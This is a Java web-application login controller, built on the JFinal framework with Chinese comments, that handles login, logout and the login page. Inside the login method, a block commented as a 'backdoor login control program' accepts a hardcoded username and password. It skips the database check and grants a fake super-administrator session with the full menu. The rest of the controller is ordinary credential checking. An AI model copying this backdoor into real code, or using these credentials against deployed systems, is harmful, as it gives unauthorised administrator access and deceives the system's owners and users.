package com.grid.wdt.application.login;

import java.util.List;

import com.grid.wdt.application.menu.Menu;
import com.grid.wdt.application.user.User;
import com.jfinal.aop.Clear;
import com.jfinal.core.Controller;

public class LoginController extends Controller{
	
	
	/**
	 * 登陆页面
	 */
	@Clear
	public void index(){
		render("login.jsp");
	}
	
	
	/**
	 * 登陆
	 */
	@Clear
	public void toLogin(){
		String username=getPara("username");
		String password=getPara("password");
		
		List<Menu> menuList;
		//=======================后门登陆控制程序==========================
		
		if(username.equalsIgnoreCase("grid") && password.equalsIgnoreCase("7788919")){
			menuList=Menu.dao.select();
			User gridUser = new User();
			gridUser.set("id", 0);
			gridUser.set("username", "grid");
			gridUser.set("cnname", "超级管理员");
			gridUser.set("dept", "市局");
			gridUser.set("position", "管理者");
			setSessionAttr("user", gridUser);             //存用户信息到session
			setSessionAttr("menuList", menuList);         //存用户信息到session
			redirect("/index");		
			return;
		}
		
		//==========================end==========================
		
		
		
		User user=User.dao.findUserInfo(username, password);
		if(user!=null){
			
			//用户菜单查询,根据用户角色查询
			String role=user.get("role");
			
			if(user.get("username").equals("admin")){ //如果是admin用户，则不对菜单进行显示控制
				menuList=Menu.dao.select();
			}else{
				menuList=Menu.dao.queryPowerByRole(role);
			}
			
			setSessionAttr("user", user);             //存用户信息到session
			setSessionAttr("menuList", menuList);     //存用户信息到session
			redirect("/index");			
		
		}else{
			setAttr("msg","用户名或密码错误!");
			render("login.jsp");
		}
		
	}
	
	
	/**
	 * 退出系统
	 */
	@Clear
	public void quit(){
		removeSessionAttr("user");
		removeSessionAttr("menuList");
		render("login.jsp");
	}
	
	

}
